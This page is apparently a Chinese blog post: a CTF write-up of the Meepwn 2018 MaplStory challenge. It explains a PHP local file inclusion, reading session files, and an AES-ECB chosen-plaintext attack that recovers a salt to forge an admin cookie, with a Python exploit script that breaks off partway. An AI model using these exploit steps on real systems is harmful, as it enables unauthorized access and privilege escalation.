@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文首发 先知社区 ，转载请注明链接。  本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。 概览打开 http:&#x2F;&#x2F;178.128.87.16 是一个登陆页面，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含">
+<meta property="og:url" content="https://findneo.github.io/180721MeepwnMaplStory/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="本文首发 先知社区 ，转载请注明链接。  本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。 概览打开 http:&#x2F;&#x2F;178.128.87.16 是一个登陆页面，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532072388162.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532088004024.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532066767366.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532072362986.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532072718776.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532072632523.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532073478518.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532073884330.png">
+<meta property="og:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532114006803.png">
+<meta property="article:published_time" content="2018-07-20T19:43:44.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/180721MeepwnMaplStory/1532072388162.png">
+
+<link rel="canonical" href="https://findneo.github.io/180721MeepwnMaplStory/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180721MeepwnMaplStory/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-07-21 03:43:44" itemprop="dateCreated datePublished" datetime="2018-07-21T03:43:44+08:00">2018-07-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>本文首发 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2463">先知社区</a> ，转载请注明链接。</strong> </p>
+<p>本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。</p>
+<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>打开 <a target="_blank" rel="noopener" href="http://178.128.87.16/">http://178.128.87.16</a> 是一个登陆页面，注册账户后有四个页面，<code>HOME</code> 是欢迎页，<code>CHARACTER </code> 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， <code>SETTING</code> 页可以修改用户名和选择头像，<code>GAME</code> 页是一个Flash小游戏，和本题无关。</p>
+<p>题目提供了源码下载，可以从 <a target="_blank" rel="noopener" href="https://ctf.meepwn.team/attachments/web/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip">这里</a> 或 <a target="_blank" rel="noopener" href="https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip">备用地址</a> 下载。</p>
+<p><img data-src="1532072388162.png" alt="1532072388162"></p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><p><code>index.php</code> 文件中有如下语句，显然存在文件包含。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但所有 <code>GET</code> 和<code>POST</code> 提交的参数都会被删除掉敏感字符串，其中 <code>//</code> 、<code>(.+)</code> 和<code> ``</code>  是比较值得注意的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.</span></span><br><span class="line">	<span class="comment">//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!</span></span><br><span class="line">	<span class="variable">$too_bad</span>=<span class="string">&quot;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&quot;</span>;</span><br><span class="line">	<span class="variable">$value</span> = preg_replace(<span class="variable">$too_bad</span>, str_repeat(<span class="string">&quot;*&quot;</span>,<span class="number">3</span>) ,<span class="variable">$value</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$value</span>))&#123;mapl_die();&#125;</span><br><span class="line">	<span class="variable">$value</span>=bad_words(<span class="variable">$value</span>);</span><br><span class="line">	<span class="variable">$_GET</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key2</span>=&gt;<span class="variable">$value2</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array(<span class="variable">$value2</span>))&#123;mapl_die();&#125;</span><br><span class="line">	<span class="variable">$value2</span>=bad_words(<span class="variable">$value2</span>);</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="variable">$key2</span>]=<span class="variable">$value2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PHP使用PHPSESSID cookie值 存储会话标识，一般在<code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code> 文件里写有一些有特定意义的字符串，其中<code>&lt;PHPSESSID&gt;</code> 可在Cookie里找到。尝试读取SESSION文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//178.128.87.16/index.php?page=/var/lib/php/sessions/sess_8es749ivbfetvsmsc0ggthr2e5</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1532088004024.png" alt="1532088004024"></p>
+<p>其中是序列化后的<code>$_SESSION</code> 和明文的操作记录，这些内容在后面会大有用处。</p>
+<h1 id="CPA猜解salt"><a href="#CPA猜解salt" class="headerlink" title="CPA猜解salt"></a>CPA猜解salt</h1><h2 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h2><p>阅读<code>login.php</code> 并跟入相关文件，可以看到有多处用到<code>$salt</code> 变量，其地位非常关键。</p>
+<p>首先是从单独的表<code>mapl_config</code> 中读出值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="variable">$configRow</span>=config_connect(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="variable">$salt</span>=<span class="variable">$configRow</span>[<span class="string">&#x27;mapl_salt&#x27;</span>];</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$configRow</span>[<span class="string">&#x27;mapl_key&#x27;</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function config_connect($conn)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        $config=mysqli_query($conn,&quot;SELECT * FROM mapl_config&quot;);</span></span><br><span class="line"><span class="comment">        return mysqli_fetch_array($config);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>如果登陆成功就将用户名和邮箱加盐加密存储的<code>$_SESSION</code> 变量里。并且将<code>admin</code> /<code>user</code> 字符串加盐加密存储在<code>$_COOKIE[&#39;_role&#39;]</code> 变量中，用以标识用户身份。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$count</span> === <span class="number">1</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;userPass&#x27;</span>]===<span class="variable">$password</span> ) <span class="comment">//登陆成功</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$secure_email</span>=encryptData(<span class="variable">$row</span>[<span class="string">&#x27;userEmail&#x27;</span>],<span class="variable">$salt</span>,<span class="variable">$key</span>);</span><br><span class="line">				<span class="variable">$secure_name</span>=encryptData(<span class="variable">$row</span>[<span class="string">&#x27;userName&#x27;</span>],<span class="variable">$salt</span>,<span class="variable">$key</span>);</span><br><span class="line">				<span class="variable">$log_content</span>=<span class="string">&#x27;[&#x27;</span>.date(<span class="string">&quot;h:i:sa&quot;</span>).<span class="string">&#x27; GMT+7] Logged In&#x27;</span>;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;character_name&#x27;</span>] = <span class="variable">$secure_name</span>;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$secure_email</span>;</span><br><span class="line">    			<span class="variable">$_SESSION</span>[<span class="string">&#x27;action&#x27;</span>]=<span class="variable">$log_content</span>;</span><br><span class="line">				<span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;userIsAdmin&#x27;</span>]===<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$data</span>=<span class="string">&#x27;admin&#x27;</span>.<span class="variable">$salt</span>;</span><br><span class="line">					<span class="variable">$role</span>=hash(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">					setcookie(<span class="string">&#x27;_role&#x27;</span>,<span class="variable">$role</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$data</span>=<span class="string">&#x27;user&#x27;</span>.<span class="variable">$salt</span>;</span><br><span class="line">					<span class="variable">$role</span>=hash(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">					setcookie(<span class="string">&#x27;_role&#x27;</span>,<span class="variable">$role</span>);					</span><br><span class="line">				&#125;</span><br><span class="line">				header(<span class="string">&quot;Location: ?page=home.php&quot;</span>);</span><br><span class="line">			&#125; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function encryptData($data,$salt,$key)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">            $encrypt=openssl_encrypt($data.$salt,&quot;AES-128-ECB&quot;,$key);</span></span><br><span class="line"><span class="comment">            $raw=base64_decode($encrypt);</span></span><br><span class="line"><span class="comment">            $final=implode(unpack(&quot;H*&quot;, $raw));</span></span><br><span class="line"><span class="comment">            return $final;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="setting-php"><a href="#setting-php" class="headerlink" title="setting.php"></a>setting.php</h2><p>再查看<code>setting.php</code> ，这个文件实现了修改用户名页面的功能 。只要修改后的名字不长于22个字符，就使用<code>mysqli_real_escape_string</code> 处理并更新记录（避免SQL注入）。会被编码的字符有的 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])&lt;=<span class="number">22</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>=mysqli_real_escape_string(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;UPDATE users SET userName=&#x27;<span class="subst">$name</span>&#x27; WHERE userEmail=&#x27;<span class="subst">$mail</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res2</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$userRow2</span>=mysqli_fetch_array(<span class="variable">$res2</span>);</span><br><span class="line">    <span class="variable">$secure_name</span>=encryptData(<span class="variable">$name</span>,<span class="variable">$salt</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;character_name&#x27;</span>] = <span class="variable">$secure_name</span>;</span><br><span class="line">    <span class="variable">$log_content</span>=<span class="string">&#x27;[&#x27;</span>.date(<span class="string">&quot;h:i:sa&quot;</span>).<span class="string">&#x27; GMT+7] Change character name&#x27;</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;action&#x27;</span>]=<span class="variable">$log_content</span>;</span><br><span class="line">    header(<span class="string">&quot;Refresh:0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所有加密操作用的是同一个<code>$salt</code> ，加上上述包含Session文件的操作，就会有构造任意明文获取对应密文的可能。最重要的，加密方式采用了<code>AES-128-ECB</code> ，<code>ECB</code> 全称<code>Electronic Codebook</code> （电码本），顾名思义，这种模式的特点就是相同的明文块加密后会得到相同的密文块。</p>
+<p>这里采用128位的分组形式，也就是每十六字节一个明文块。举栗说明：</p>
+<p>如果用户名是<code>findneo</code> 七个字节，<code>$salt</code> 是<code>xianzhi</code> 八个字节，那么加密过程就是把<code>findneoxianzhi</code> 共十五个字节作为一个分组去加密，缺一个字节按算法padding。</p>
+<p>如果用户名是<code>hifindneo</code> 共九个字节，那么加密过程就是对<code>hifindne</code> 和<code>oxianzhi</code> 作为两个分组加密。</p>
+<p>我们可以在<code>SETTING</code> 页面修改用户名来改变明文，然后使用文件包含读到Session文件内容来获取密文，这就是一个完整的选择明文攻击过程。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>怎么攻击呢？比如用户名是<code>findneo</code> ，（我们还不知道<code>$salt</code> 是<code>xianzhi</code> ） ，那么加密的第一个明文分组是<code>findneox</code> ，记录下<code>$_SESSION[&#39;character_name&#39;]</code> 的前32个字节十六进制数，也就是密文的第一个分组。</p>
+<p>然后依次改变用户名为<code>findneoa</code> 、<code>findneob</code> 、.etc，并记录密文第一个分组。直到用户名为<code>findneox</code> 时发现密文第一个分组与用户名为<code>findneo</code> 时的相同。根据ECB模式的特点，就能知道<code>$salt</code> 的第一个字节为<code>x</code> ，事实上也确实如此。</p>
+<p>测试发现用户名长15个字符时，<code>$_SESSION[&#39;character_name&#39;]</code> 有64字节十六进制数，也就是加盐加密后是32个字符，用户名长为16个字符时，<code>$_SESSION[&#39;character_name&#39;]</code> 有96字节，也就加盐加密后有48个字符。这说明<code>$salt</code> 长为16个字节。</p>
+<p>然后就可以按照以上原理猜解<code>$salt</code> ，伪造<code>$_COOKIE[&#39;_role&#39;]</code> ，成为管理员。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">&quot;http://178.128.87.16/&quot;</span></span><br><span class="line">cookie = <span class="built_in">dict</span>(</span><br><span class="line">    PHPSESSID=<span class="string">&#x27;t9p07a1qt2plbcqp8tpkib4794&#x27;</span>,</span><br><span class="line">    <span class="comment"># _role=&#x27;8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_sess</span>():</span></span><br><span class="line">    r = requests.get(</span><br><span class="line">        url + <span class="string">&quot;?page=/var/lib/php/sessions/sess_&quot;</span> + cookie[<span class="string">&#x27;PHPSESSID&#x27;</span>],</span><br><span class="line">        cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sess_character_name</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;read_sess():</span></span><br><span class="line"><span class="string">    character_name|s:64:&quot;6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820&quot;;</span></span><br><span class="line"><span class="string">    user|s:64:&quot;82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38&quot;;</span></span><br><span class="line"><span class="string">    action|s:40:&quot;[12:04:21pm GMT+7] Change character name&quot;;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    character_name = read_sess().split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&quot;:&quot;</span>)[-<span class="number">1</span>][<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> character_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">character_name</span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(name=character_name, submit=<span class="string">&#x27;Edit&#x27;</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;?page=setting.php&quot;</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span>():</span></span><br><span class="line">    r = requests.get(url + <span class="string">&quot;?page=home.php&quot;</span>, cookies=cookie)</span><br><span class="line">    s = BeautifulSoup(r.content, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> s.h2.get_text().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_and_check</span>(<span class="params">name</span>):</span></span><br><span class="line">    change_name(name)</span><br><span class="line">    <span class="comment"># whoami()</span></span><br><span class="line">    <span class="keyword">return</span> get_sess_character_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span>():</span></span><br><span class="line">    junk = <span class="string">&#x27;x&#x27;</span> * <span class="number">16</span></span><br><span class="line">    salt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="string">&#x27;ms_g00d_0ld_g4m3&#x27;</span> + string.printable</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        cmp = change_and_check(junk[:i])[:<span class="number">32</span>]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 